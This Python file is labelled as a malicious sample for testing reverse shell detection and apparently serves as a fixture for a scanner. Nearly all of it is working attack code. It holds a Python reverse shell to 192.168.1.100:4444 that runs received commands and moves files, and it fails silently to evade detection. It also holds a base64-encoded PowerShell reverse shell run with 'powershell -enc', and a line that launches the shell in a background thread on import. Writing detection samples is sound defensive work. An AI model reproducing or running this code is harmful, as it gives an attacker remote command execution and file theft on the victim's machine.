"""
MALICIOUS SAMPLE - Tests reverse shell detection
"""

import socket
import subprocess
import threading
import base64


def create_reverse_shell(host="192.168.1.100", port=4444):
    """Creates a reverse shell connection"""
    try:
        # Create socket connection
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Send initial connection info
        hostname = subprocess.check_output("hostname", shell=True)
        s.send(f"Connected from: {hostname.decode()}\\n".encode())

        while True:
            # Receive command
            command = s.recv(1024).decode().strip()

            if command.lower() in ["exit", "quit"]:
                break
            elif command.lower() == "download":
                # File download capability
                filename = s.recv(1024).decode().strip()
                download_file(s, filename)
            elif command.lower().startswith("upload"):
                # File upload capability
                upload_file(s, command)
            else:
                # Execute command
                try:
                    output = subprocess.check_output(
                        command, shell=True, stderr=subprocess.STDOUT
                    )
                    s.send(output)
                except Exception as e:
                    s.send(f"Error: {str(e)}\\n".encode())

        s.close()
    except Exception as e:
        # Silently fail to avoid detection
        pass


def powershell_reverse_shell():
    """PowerShell-based reverse shell for Windows"""
    # Base64 encoded PowerShell payload
    ps_payload = """
    $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);
    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush();
    }
    """

    encoded_payload = base64.b64encode(ps_payload.encode("utf-16le")).decode()

    # Execute PowerShell
    subprocess.run(f"powershell -enc {encoded_payload}", shell=True)


# Start reverse shell in background
threading.Thread(target=create_reverse_shell, daemon=True).start()
